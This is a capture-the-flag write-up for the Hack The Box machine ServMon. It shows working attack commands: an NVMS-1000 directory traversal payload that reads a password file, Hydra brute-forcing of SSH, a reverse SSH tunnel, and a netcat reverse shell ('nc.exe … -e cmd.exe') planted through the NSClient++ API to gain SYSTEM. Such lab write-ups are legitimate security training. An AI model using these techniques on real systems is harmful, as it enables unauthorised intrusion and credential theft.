---
permalink: /posts/HTB/ServMon
title:  "HTB ServMon"
author: Luc Kolen
description: "ServMon is an easy Windows machine on HTB"
categories:
  - CTF
  - HTB
tags:
  - HTB-Easy
  - Windows
  - FTP
  - NVMS
  - Directory Traversal
  - Hydra
  - SSH Tunnel
  - NSClient++
---
# 10.10.10.184 - ServMon

- [10.10.10.184 - ServMon](#101010184---servmon)
  - [Open ports](#open-ports)
  - [FTP](#ftp)
    - [Users/Nadine/Confidential.txt](#usersnadineconfidentialtxt)
    - [Users/Nathan/Notes to do.txt](#usersnathannotes-to-dotxt)
  - [HTTP](#http)
  - [SSH](#ssh)
  - [Privilege escalation](#privilege-escalation)
  - [TL:DR](#tldr)

## Open ports

```bash
luc@kali:~/HTB/ServMon$ nmap -vv --reason -Pn -A --osscan-guess --version-all -p- 10.10.10.184
```

|Port|Service|Version
|---|---|---|
21/tcp|ftp|Microsoft ftpd
22/tcp|ssh|OpenSSH for_Windows_7.7 (protocol 2.0)
80/tcp|http|
135/tcp|msrpc|Microsoft Windows RPC
139/tcp|netbios-ssn|Microsoft Windows netbios-ssn
445/tcp|microsoft-ds?|
5040/tcp|unknown|
5666/tcp|tcpwrapped|
6063/tcp|tcpwrapped|
6699/tcp|tcpwrapped|
7680/tcp|pando-pub?|
8443/tcp|ssl/https-alt|

## FTP

```bash
luc@kali:~/HTB/ServMon$ ftp 10.10.10.184
Connected to 10.10.10.184.
220 Microsoft FTP Service
Name (10.10.10.184:luc): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
01-18-20  12:05PM       <DIR>          Users
226 Transfer complete.
ftp> exit
221 Goodbye.
```

We've anonymous FTP access to a Users folder

```bash
luc@kali:~/HTB/ServMon$ mkdir ftp_anonymous
luc@kali:~/HTB/ServMon$ cd ftp_anonymous/
luc@kali:~/HTB/ServMon/ftp_anonymous$ wget -m ftp://10.10.10.184
luc@kali:~/HTB/ServMon/ftp_anonymous$ ls -R
.:
10.10.10.184

./10.10.10.184:
Users

./10.10.10.184/Users:
Nadine  Nathan

./10.10.10.184/Users/Nadine:
Confidential.txt

./10.10.10.184/Users/Nathan:
'Notes to do.txt'
```

We've now downloaded all available files on the FTP server to our machine.

### Users/Nadine/Confidential.txt

```text
Nathan,

I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.

Regards

Nadine
```

This note shows us that there is a `Passwords.txt` file on Nathan's desktop, this could be interesting in case we get access to an account with privileges to read files on his desktop.

### Users/Nathan/Notes to do.txt

```text
1) Change the password for NVMS - Complete
2) Lock down the NSClient Access - Complete
3) Upload the passwords
4) Remove public access to NVMS
5) Place the secret files in SharePoint
```

We can see that not all planned work on this machine has completed. This could be useful information during the next steps.

## HTTP

The open FTP server gave us some information, but no way into the machine yet.

Opening `http://10.10.10.184/` in our browser shows the `NVMS-1000` login page. We know from the `Notes to do.txt` file we found earlier that the password has been changed so we probably aren't able to use default credentials, admin:12345. We still try those, but receive an expected `User name or password error!`.

```bash
luc@kali:~/HTB/ServMon$ searchsploit nvms
...
NVMS 1000 - Directory Traversal | hardware/webapps/47774.txt
...
```

Luckily for us there is a known exploit for `NVMS 1000`, [47774 - NVMS 1000 - Directory Traversal](https://www.exploit-db.com/exploits/47774).

```http
GET /../../../../../../../../../../../../windows/win.ini HTTP/1.1
Host: 10.10.10.184

; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```

We can confirm that the proof of concept works on the machine. This is where the note about Nathan's desktop containing a passwords.txt file becomes interesting.

```http
GET /../../../Users/Nathan/Desktop/Passwords.txt HTTP/1.1
Host: 10.10.10.184

1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$
```

## SSH

We now have a list of passwords and 2 possible users, Nadine and Nathan.

```bash
luc@kali:~/HTB/ServMon$ printf 'Nadine\nNathan' > users.txt
luc@kali:~/HTB/ServMon$ printf '1nsp3ctTh3Way2Mars!\nTh3r34r3To0M4nyTrait0r5!\nB3WithM30r4ga1n5tMe\nL1k3B1gBut7s@W0rk\n0nly7h3y0unGWi11F0l10w\nIfH3s4b0Utg0t0H1sH0me\nGr4etN3w5w17hMySk1Pa5$' > passwords.txt
luc@kali:~/HTB/ServMon$ hydra -L users.txt -P passwords.txt ssh://10.10.10.184
...
[22][ssh] host: 10.10.10.184   login: Nadine   password: L1k3B1gBut7s@W0rk
...
luc@kali:~/HTB/ServMon$ ssh nadine@10.10.10.184
nadine@10.10.10.184's password: L1k3B1gBut7s@W0rk
Microsoft Windows [Version 10.0.18363.752]
(c) 2019 Microsoft Corporation. All rights reserved.

nadine@SERVMON C:\Users\Nadine>whoami
servmon\nadine

nadine@SERVMON C:\Users\Nadine>cd Desktop

nadine@SERVMON C:\Users\Nadine\Desktop>type user.txt
4850b7dd************************
```

## Privilege escalation

The `Notes to do.txt` file mentioned `2) Lock down the NSClient Access - Complete`.

```bash
nadine@SERVMON C:\Program Files\NSClient++>type nsclient.ini
...
password = ew2x6SsGTxjRwXOT
...
```

We can find the password in a config file, but we can only use this via localhost.

```bash
nadine@SERVMON C:\Program Files\NSClient++>netstat -ano
...
  TCP    0.0.0.0:8443           0.0.0.0:0              LISTENING       2652
...
nadine@SERVMON C:\Program Files\NSClient++>tasklist /fi "pid eq 2652"
ERROR: Access denied
nadine@SERVMON C:\Program Files\NSClient++>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Program Files\NSClient++> Get-Process -id 2652

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    311      23     5548      18392              2652   0 nscp
```

We use `netstat` to list all listening ports on the machine. We see port 8443 which wasn't shown in our `NMAP` scan because outside traffic is blocked. We try using `tasklist` to see what process is running on this port, but it's blocked. The `PowerShell` command `Get-Process` isn't blocked so we can still get the process name, `nscp`. This matches with `NSClient++` which we expected to see running on the machine.

```bash
luc@kali:~/HTB/ServMon$ sudo service ssh start
luc@kali:~/HTB/ServMon$ cp /usr/share/windows-resources/binaries/nc.exe .
luc@kali:~/HTB/ServMon$ sudo python2 /opt/impacket/examples/smbserver.py share `pwd` -smb2support
```

```bash
nadine@SERVMON C:\Users\Nadine\Downloads>copy \\10.10.14.16\share\nc.exe
        1 file(s) copied.

nadine@SERVMON Z:\>ssh -N -R 10.10.14.16:8443:127.0.0.1:8443 luc@10.10.14.16
```

We've now created a tunnel for port 8443 so we can access that port from our local machine, we also copied `nc.exe` to the target machine.

```bash
luc@kali:~/HTB/ServMon$ echo '@echo off' > evil.bat
luc@kali:~/HTB/ServMon$ echo 'C:\Users\Nadine\Downloads\nc.exe 10.10.14.16 443 -e cmd.exe' >> evil.bat
luc@kali:~/HTB/ServMon$ curl -s -k -u admin -X PUT https://localhost:8443/api/v1/scripts/ext/scripts/check_new.bat --data-binary @evil.bat
Enter host password for user 'admin': ew2x6SsGTxjRwXOT
Added check_new as scripts\check_new.bat
```

The added task should now be visible in `https://localhost:8443/index.html#/queries/check_new`.

```bash
luc@kali:~/HTB/ServMon$ sudo nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.184.
Ncat: Connection from 10.10.10.184:50123.
Microsoft Windows [Version 10.0.18363.752]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Program Files\NSClient++>whoami
nt authority\system
C:\Program Files\NSClient++>cd \Users\Administrator\Desktop
C:\Users\Administrator\Desktop>type root.txt
29741f96************************
```

`NSClient++` is running as `nt authority\system` so we get a shell with those privileges and we can read the `root.txt` file.

## TL:DR

- Anonymous FTP access gave hints about where to find a password file
- Directory traversal in NVMS 1000 to show that password file
- SSH login as Nadine
- Start SSH tunnel to access NSClient++
- Add task to NSClient++ which runs as system
